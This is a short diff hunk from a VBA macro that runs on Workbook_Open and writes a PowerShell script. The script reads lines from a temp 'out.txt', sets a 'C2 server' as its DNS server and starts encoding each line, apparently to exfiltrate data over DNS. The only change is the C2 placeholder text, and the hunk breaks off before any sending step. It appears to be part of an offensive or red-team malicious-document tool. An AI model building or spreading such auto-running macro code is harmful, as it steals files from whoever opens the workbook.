@@ -5,7 +5,7 @@ Private Sub Workbook_Open()
     Set objFile = objFSO.CreateTextFile(outFile, True)
 
     objFile.WriteLine ("$lines = Get-Content %PUBLIC%\AppData\Local\Temp\Update\out.txt")
-    objFile.WriteLine ("$dnsserver = ""Your own C2 server""")
+    objFile.WriteLine ("$dnsserver = ""%Your own C2 server%""")
     objFile.WriteLine ("foreach ($line in $lines){")
     objFile.WriteLine ("    echo ""Line: $line""")
     objFile.WriteLine ("    $Bytes = [System.Text.Encoding]::Unicode.GetBytes($line)")
